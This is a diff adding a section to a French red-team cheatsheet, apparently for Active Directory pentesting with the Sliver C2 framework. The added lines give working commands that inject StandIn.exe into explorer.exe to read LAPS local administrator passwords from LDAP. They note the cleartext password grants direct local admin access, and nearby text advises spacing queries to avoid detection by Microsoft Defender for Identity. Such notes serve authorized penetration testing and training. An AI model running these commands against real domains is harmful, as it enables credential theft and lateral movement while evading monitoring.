@@ -64,6 +64,16 @@ Collecte fractionnée conseillée (les requêtes LDAP consécutives alertent MDI
 > [!note] OPSEC énumération
 > Tout outil qui enchaîne des requêtes LDAP est visible sous MDI. Activer la verbosité une fois pour comprendre les filtres LDAP émis, puis espacer les collectes. Préférer `--object`/`--filter` (ciblé) aux dumps massifs.
 
+### LAPS — lire le mot de passe admin local
+
+```bash
+# Machines gérées par LAPS + lecture de ms-mcs-admpwd (là où on a le droit)
+execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--object "(ms-mcs-admpwdexpirationtime=*)" --filter ms-mcs-admpwd,name'
+execute-assembly -p explorer.exe -t 45 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--object samaccountname=<computer>$ --filter ms-mcs-admpwd'
+```
+
+`ms-Mcs-AdmPwd` est en clair → accès admin local direct (`winrs`/scshell) sans PtH. Repérer d'abord *qui* peut lire l'attribut (groupe délégué) via les ACL. Voir [[Cheatsheet - LAPS]].
+
 ## Related
 - [[Énumération AD]]
 - [[Sliver - Exécution et évasion]]
